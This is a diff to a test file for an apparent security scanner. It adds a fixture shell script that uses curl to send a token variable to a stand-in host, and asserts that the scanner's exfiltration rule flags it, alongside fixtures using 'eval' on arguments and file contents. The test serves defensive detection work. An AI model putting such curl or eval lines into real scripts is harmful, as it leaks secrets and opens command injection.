@@ -205,6 +205,10 @@ test("incomplete bounded scans receive coverage findings and cannot be low risk"
   ].join("\n"));
   await writeFile(join(adversarial, "build", "risky.sh"), '# eval "$IGNORED_COMMENT"\neval $@\n`printf synthetic-shell`\n');
   await writeFile(join(adversarial, "build", "constructed.sh"), 'eval $(cat synthetic-command.txt)\n');
+  await writeFile(
+    join(adversarial, "build", "shebang-exfil.sh"),
+    '#!/bin/sh\ncurl https://example.invalid/upload --data "$SYNTHETIC_TOKEN"\n'
+  );
   await writeFile(join(adversarial, "test", "ignored.txt"), "exec(\"must not be scanned\")\n");
 
   await writeFile(join(adversarial, "ordinary-prose.md"), 'The test, run, and data terms are ordinary prose here. Markdown documents `eval "$COMMAND"` and `printf synthetic` as examples.\n');
@@ -246,10 +250,16 @@ test("incomplete bounded scans receive coverage findings and cannot be low risk"
   assert.ok(findings(report).some((item) => item.ruleId === "PHA-NET-001" && item.file === "dist/risky.js"));
   assert.ok(findings(report).some((item) => item.ruleId === "PHA-PROMPT-001" && item.file === "prompt.md"));
   assert.equal(findings(report).some((item) => item.ruleId === "PHA-EXFIL-001" && item.file === "docs.md"), false);
-  const exfiltration = findingFor(report, "PHA-EXFIL-001");
+  const exfiltration = findings(report).find((item) => item.ruleId === "PHA-EXFIL-001" && item.file === "exfil.js");
+  assert.ok(exfiltration, "file reads paired with network requests must be detected as exfiltration");
   assert.equal(exfiltration.file, "exfil.js");
   assert.equal(exfiltration.severity, "high");
   assert.equal(exfiltration.confidence, "medium");
+  const shellExfiltration = findings(report).find(
+    (item) => item.ruleId === "PHA-EXFIL-001" && item.file === "build/shebang-exfil.sh"
+  );
+  assert.ok(shellExfiltration, "curl using a sensitive variable after a shebang must be detected as exfiltration");
+  assert.equal(shellExfiltration.line, 2);
   assert.ok(findings(report).some((item) => item.ruleId === "PHA-EXEC-002" && item.file === "build/risky.sh"));
   assert.ok(findings(report).some((item) => item.ruleId === "PHA-EXEC-002" && item.file === "build/constructed.sh"));
   assert.equal(findings(report).some((item) => item.ruleId === "PHA-EXEC-001" && item.file === "ordinary-prose.md"), false);
